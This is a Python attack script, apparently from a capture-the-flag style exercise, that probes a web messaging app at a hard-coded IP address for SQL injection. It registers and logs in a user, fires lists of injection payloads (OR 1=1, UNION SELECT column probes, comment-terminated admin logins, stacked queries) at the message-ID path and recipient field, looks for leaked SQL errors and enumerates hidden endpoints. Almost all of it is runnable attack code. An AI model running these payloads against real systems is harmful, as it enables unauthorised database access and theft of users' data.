import requests
import re

base = 'http://154.57.164.80:31506'

# Since this is Express + likely SQLite, let me try SQL injection more carefully
# The 401 on login may mean the query works but password doesn't match
# Let's try UNION-based SQLi

s = requests.Session()

# Try SQLi on login - the app might use something like:
# SELECT * FROM users WHERE username = ? AND password = ?
# Or it might hash the password first

# Let's test if the app hashes passwords or compares directly
# by trying to register and login with the same credentials
s.post(f'{base}/register', data={'username': 'sqli_test_user', 'password': 'pass123'})
r = s.post(f'{base}/login', data={'username': 'sqli_test_user', 'password': 'pass123'}, allow_redirects=False)
print(f"Normal login: {r.status_code}")

# Now try SQLi on the message reading endpoint
# /messages/:id might be vulnerable
s.post(f'{base}/login', data={'username': 'sqli_test_user', 'password': 'pass123'})

# Send a message first to have something
s.post(f'{base}/messages', data={'to_username': 'sqli_test_user', 'content': 'test'}, allow_redirects=True)

# Try SQLi on message ID
sqli_ids = [
    '1 OR 1=1',
    '1 UNION SELECT 1,2,3,4,5',
    "1' OR '1'='1",
    '0 UNION SELECT 1,2,3,4,5--',
    '0 UNION SELECT 1,2,3,4,5,6--',
    '0 UNION SELECT 1,2,3,4,5,6,7--',
    '0 UNION SELECT 1,2,3,4,5,6,7,8--',
    "1; SELECT * FROM users--",
    "-1 OR 1=1",
    "1/**/OR/**/1=1",
]

print("\n=== SQLi ON MESSAGE ID ===")
for sqli in sqli_ids:
    r = s.get(f'{base}/messages/{sqli}')
    if r.status_code == 200:
        match = re.search(r'letter-copy">(.*?)</pre>', r.text, re.DOTALL)
        content = match.group(1) if match else 'N/A'
        from_match = re.search(r'From: (.*?)</strong>', r.text)
        frm = from_match.group(1) if from_match else 'N/A'
        print(f"  {sqli!r:50} -> 200 from={frm} content={content[:100]}")
    elif r.status_code != 404:
        print(f"  {sqli!r:50} -> {r.status_code}")

# Try SQLi on the to_username field when sending messages
print("\n=== SQLi ON TO_USERNAME (message send) ===")
sqli_users = [
    "admin' --",
    "admin'/*",
    "admin' OR 1=1 --",
]
for sqli in sqli_users:
    r = s.post(f'{base}/messages', data={'to_username': sqli, 'content': 'test'}, allow_redirects=False)
    print(f"  {sqli!r:40} -> {r.status_code} loc={r.headers.get('Location', '')}")

# Let's look more carefully at the error pages for SQL errors
print("\n=== DETAILED ERROR RESPONSES ===")
# Try numeric and string injection in message ID
for test_id in ["1'", '1"', '1`', "1\\", "1 AND 1=1", "1 AND 1=2"]:
    r = s.get(f'{base}/messages/{test_id}')
    if r.status_code == 500:
        print(f"  /messages/{test_id} -> 500 ERROR!")
        print(f"    Body: {r.text[:300]}")
    elif r.status_code != 404:
        print(f"  /messages/{test_id} -> {r.status_code}")

# Try looking at what the error page reveals
r = s.get(f'{base}/nonexistent')
print(f"\n404 page: {r.text[:300]}")

# Check if there is a /sent or /outbox endpoint
print("\n=== CHECKING SENT/OUTBOX ===")
for path in ['/sent', '/outbox', '/messages/sent', '/messages/outbox']:
    r = s.get(f'{base}{path}', allow_redirects=False)
    if r.status_code != 404:
        print(f"  {path}: {r.status_code}")
        if r.status_code == 200:
            print(f"    Body: {r.text[:500]}")
